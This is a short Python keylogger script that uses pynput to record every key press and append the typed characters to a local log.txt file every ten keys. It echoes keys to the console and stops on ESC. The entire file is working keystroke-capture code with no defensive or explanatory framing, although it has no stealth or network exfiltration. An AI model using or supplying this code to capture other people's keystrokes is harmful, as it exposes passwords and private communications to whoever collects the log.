from pynput.keyboard import Key,Listener

count = 0
keys = []

#defines what happens after hitting the keys
def on_press(key):
    global keys,count

    keys.append(key)               # saving in the text file
    count += 1 
    print(f'{key} is pressed')

    if count >= 10 :               # resetting values in intervals while writing the keys in file
        count = 0
        write_file(keys)
        keys = []

#defines how we write into the file
def write_file(keys):
    with open('log.txt' , 'a') as f :
        for key in keys:
            k = str(key).replace("'", ' ')
            if k.find('space') > 0:
                f.write('\n')
            elif k.find('Key') == -1:
                f.write(k)

#pressing the ESC key will exit the loop
def on_release(key):
    if key == Key.esc :
        return False

#Listener object
with Listener(on_press = on_press, on_release = on_release) as listener :
    listener.join()